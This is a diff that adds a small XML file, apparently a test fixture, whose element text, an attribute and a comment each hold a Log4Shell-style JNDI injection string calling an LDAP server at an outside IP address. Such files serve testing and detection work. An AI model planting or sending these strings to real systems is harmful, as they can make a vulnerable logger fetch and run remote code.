@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<root>
+  <field name="a">${jndi:ldap://47.92.29.251:1389/xml1}</field>
+  <field name="b" value="${jndi:ldap://47.92.29.251:1389/xml2}"/>
+  <!-- ${jndi:ldap://47.92.29.251:1389/xml3} -->
+</root>
